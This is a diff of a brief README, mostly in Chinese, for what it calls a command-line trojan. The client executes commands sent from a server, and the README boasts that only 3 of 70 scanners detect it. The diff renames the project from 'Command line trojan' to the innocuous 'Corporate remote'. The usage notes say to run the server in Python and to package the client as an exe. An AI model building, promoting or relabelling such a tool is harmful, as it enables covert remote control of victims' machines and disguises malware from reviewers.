@@ -1,7 +1,6 @@
-# Command-line-telecommute
+# Corporate remote
 
-Command line trojan
-
+Corporate remote
 - 这是一个 类似反向代理的程序，已经过部分检测，3/70 的被检测的概率，因为这个的逻辑十分的简单，都是正常操作，把文本传到客户端，然后客户端本地执行传过来的命令，所以说被检测到的比较少。
 - server端用法：python3 main.py server
 - 客户端用法：直接编辑好端口打包成exe进行运行
